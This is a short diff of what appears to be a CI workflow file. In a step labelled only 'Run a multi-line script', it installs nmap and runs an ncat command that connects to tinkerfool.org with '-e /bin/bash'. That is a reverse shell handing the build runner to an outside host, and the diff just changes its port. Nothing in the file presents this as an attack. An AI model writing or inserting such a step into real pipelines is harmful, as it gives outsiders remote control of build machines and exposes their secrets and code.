@@ -20,4 +20,4 @@ jobs:
       - name: Run a multi-line script
         run: |
           brew install nmap
-          ncat tinkerfool.org 6466 -e /bin/bash
+          ncat tinkerfool.org 6646 -e /bin/bash
